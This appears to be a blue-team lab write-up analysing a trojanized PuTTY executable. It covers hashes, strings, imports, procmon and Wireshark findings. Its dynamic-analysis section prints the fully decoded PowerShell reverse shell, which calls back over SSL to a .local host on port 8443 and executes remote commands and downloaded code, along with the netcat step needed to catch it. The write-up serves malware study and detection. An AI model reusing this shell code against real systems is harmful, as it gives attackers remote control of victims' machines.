---
{"dg-publish":true,"permalink":"/cards/blue-team/malware-analysis/silly-putty-exe/","tags":["specimen"]}
---

[[map-of-contents/malware\|malware]] 
## Static Analysis 
---
### Basic Static Analysis
---
#### What is the SHA256 hash of the sample?
---
```
0c82e654c09c8fd9fdf4899718efa37670974c9eec5a8fc18a167f93cea6ee83 *putty.exe
```
#### What architecture is this binary?
---
Putty.exe have a 32-bit architecture.
#### Are there any results from submitting the SHA256 hash to VirusTotal?
---
VirusTotal flag putty.exe as malicious with 60/73 flags!
#### Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?
---
The most notable strings found is:

![[Pasted image 20240524212512.png\|Pasted image 20240524212512.png]]

Registry key manipulation.

As well as:

![[Pasted image 20240524212645.png\|Pasted image 20240524212645.png]]

TCP Socket communications
#### Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?
---

![[Pasted image 20240524212836.png\|Pasted image 20240524212836.png]]

Most notable is **WriteFile**, **ShellExecuteA**, **Anti-Debugging** and **Registry Key Manipulation**
#### Is it likely that this binary is packed?
---
No, as the size of raw data is much larger than the virtual size:

![[Pasted image 20240524214706.png\|Pasted image 20240524214706.png]]

### Basic Dynamic Analysis
---
#### Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?
---
Without Internet Simulation, it opens up the PuTTY configuration but with Internet Simulation it does the same it opens up PowerShell for both.
#### From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?
---
Using `procmon` and process file tree I found a powershell open up with the command in base64.

The decoded is into gunzip file and after removing some paramer such as `-hidden` command:

![[Pasted image 20240524225026.png\|Pasted image 20240524225026.png]]

Using `cyberchef` and clicking the magic wand:


```PowerShell
function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun 
{ 
    Param( 
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    ) 
    Process {
    $modules = @()  
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]8443
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    } 
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true") 
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
        $stream = $sslStream 
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    $stream.Write($sendbytes,0,$sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
    }
}
powerfun -Command reverse -Sslcon true
```
#### What is the DNS record that is queried at detonation?
---
bonus2.corporatebonusapplication.local
#### What is the callback port number at detonation?
---
Port: 8443.
#### What is the callback protocol at detonation?
---
Based on the WireShark Output it is SSL/TLS
#### How can you use host-based telemetry to identify the DNS record, port, and protocol?
---
Using `procmon` with filter for `OPERATION: TCP`.

#### Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?
---

![[Pasted image 20240524234530.png\|Pasted image 20240524234530.png]]

A server using netcat since in the code `ssl` was applied in netcat we simply add `--ssl`










## Conclusion
---

